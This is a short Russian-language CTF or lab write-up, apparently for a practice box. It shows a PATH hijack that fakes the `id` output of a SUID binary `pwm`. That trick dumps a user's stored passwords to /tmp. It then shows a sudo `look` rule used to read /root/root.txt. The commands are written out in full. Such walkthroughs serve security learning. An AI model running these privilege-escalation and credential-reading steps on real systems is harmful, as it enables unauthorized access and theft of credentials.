## Эксплуатация SUID `pwm`

В системе обнаружил SUID-бинарник `/usr/sbin/pwm`. Программа использовала команду `id` без абсолютного пути. Это позволило подменить её через `PATH`.

Создал собственный файл `/tmp/id` и добавил `/tmp` в начало `PATH`:

```bash
cat > /tmp/id <<'EOF'
#!/bin/sh
echo 'uid=1000(think) gid=1000(think) groups=1000(think)'
EOF
chmod +x /tmp/id
export PATH=/tmp:$PATH
```

Запуск `/usr/sbin/pwm` выполнялся с SUID-привилегиями. Бинарник принял поддельный вывод `id`, прочитал `/home/think/.passwords` и вывел список учётных данных.

Сохранил его в файл:

```bash
/usr/sbin/pwm > /tmp/passlist.txt
```

## Переход к `think` и повышение привилегий

После использования найденных данных перешёл к пользователю `think` и проверил его разрешения `sudo`.

![Полученный список паролей](../images/Pasted%20image%2020260312114210.png)

Оказалось, что `think` может запускать от root утилиту `look`.

![Разрешение sudo для утилиты look](../images/Pasted%20image%2020260312114949.png)

`look` предназначена для поиска строк по префиксу, но при запуске с пустым префиксом может вывести содержимое указанного файла:

```bash
sudo /usr/bin/look "" /root/root.txt
```

![Чтение root.txt через look](../images/Pasted%20image%2020260312115903.png)
